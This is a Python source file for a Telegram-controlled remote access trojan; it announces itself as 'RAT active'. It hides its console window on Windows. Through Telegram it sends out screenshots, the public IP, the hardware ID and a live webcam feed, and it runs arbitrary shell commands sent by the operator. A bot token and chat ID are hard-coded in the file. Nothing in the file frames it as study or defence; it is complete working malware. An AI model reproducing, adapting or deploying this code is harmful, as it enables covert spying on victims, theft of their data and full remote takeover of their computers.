import os
import sys
import subprocess
import threading
import time
import ctypes
import wmi
import pythoncom
import cv2
import pyautogui
import requests
import tempfile
from PIL import Image
from io import BytesIO
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes

BOT_TOKEN = "8755658192:AAEEkXaihdEPyTRbj33bVt_-9ckubS2uiDA"
CHAT_ID = "7894519456"

# Stealth: hide console window on Windows
if sys.platform == "win32":
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# Global flag for webcam streaming
webcam_running = False
webcam_thread = None

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_chat.id) != CHAT_ID:
        return
    await update.message.reply_text("RAT active. Commands: /screenshot /ip /hwid /webcam /message <text> /command <cmd>")

async def screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_chat.id) != CHAT_ID:
        return
    try:
        screenshot = pyautogui.screenshot()
        with BytesIO() as output:
            screenshot.save(output, format="PNG")
            output.seek(0)
            await update.message.reply_photo(photo=output, caption="Screenshot taken")
    except Exception as e:
        await update.message.reply_text(f"Screenshot error: {str(e)}")

async def ip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_chat.id) != CHAT_ID:
        return
    try:
        public_ip = requests.get("https://api.ipify.org", timeout=5).text
        await update.message.reply_text(f"Public IP: {public_ip}")
    except Exception as e:
        await update.message.reply_text(f"IP error: {str(e)}")

async def hwid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_chat.id) != CHAT_ID:
        return
    try:
        pythoncom.CoInitialize()
        c = wmi.WMI()
        hwid = c.Win32_ComputerSystemProduct()[0].UUID
        pythoncom.CoUninitialize()
        await update.message.reply_text(f"HWID (UUID): {hwid}")
    except Exception as e:
        await update.message.reply_text(f"HWID error: {str(e)}")

def webcam_loop(chat_id, context):
    global webcam_running
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        context.bot.send_message(chat_id=chat_id, text="Webcam not accessible")
        webcam_running = False
        return
    while webcam_running:
        ret, frame = cap.read()
        if not ret:
            break
        _, img_encoded = cv2.imencode('.jpg', frame)
        img_bytes = img_encoded.tobytes()
        try:
            context.bot.send_photo(chat_id=chat_id, photo=img_bytes, caption="Webcam feed")
        except:
            pass
        time.sleep(2)  # send frame every 2 seconds
    cap.release()

async def webcam(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global webcam_running, webcam_thread
    if str(update.effective_chat.id) != CHAT_ID:
        return
    if webcam_running:
        webcam_running = False
        if webcam_thread and webcam_thread.is_alive():
            webcam_thread.join(timeout=3)
        await update.message.reply_text("Webcam streaming stopped")
    else:
        webcam_running = True
        webcam_thread = threading.Thread(target=webcam_loop, args=(update.effective_chat.id, context), daemon=True)
        webcam_thread.start()
        await update.message.reply_text("Webcam streaming started (1 frame per 2s)")

async def message_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_chat.id) != CHAT_ID:
        return
    if not context.args:
        await update.message.reply_text("Usage: /message <text>")
        return
    msg = " ".join(context.args)
    try:
        # Full-screen popup using Tkinter (stealth, no taskbar icon)
        import tkinter as tk
        root = tk.Tk()
        root.attributes("-fullscreen", True)
        root.attributes("-topmost", True)
        root.overrideredirect(True)
        root.config(cursor="none")
        label = tk.Label(root, text=msg, font=("Arial", 48), fg="white", bg="black")
        label.pack(expand=True)
        root.after(7000, root.destroy)
        root.mainloop()
        await update.message.reply_text(f"Message displayed for 7s: {msg}")
    except Exception as e:
        await update.message.reply_text(f"Message error: {str(e)}")

async def command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_chat.id) != CHAT_ID:
        return
    if not context.args:
        await update.message.reply_text("Usage: /command <cmd>")
        return
    cmd = " ".join(context.args)
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout + result.stderr
        if len(output) > 4000:
            output = output[:4000] + "\n...truncated"
        await update.message.reply_text(f"Command output:\n{output}")
    except subprocess.TimeoutExpired:
        await update.message.reply_text("Command timed out (30s)")
    except Exception as e:
        await update.message.reply_text(f"Command error: {str(e)}")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("screenshot", screenshot))
    app.add_handler(CommandHandler("ip", ip))
    app.add_handler(CommandHandler("hwid", hwid))
    app.add_handler(CommandHandler("webcam", webcam))
    app.add_handler(CommandHandler("message", message_cmd))
    app.add_handler(CommandHandler("command", command))
    app.run_polling()

if __name__ == "__main__":
    main()
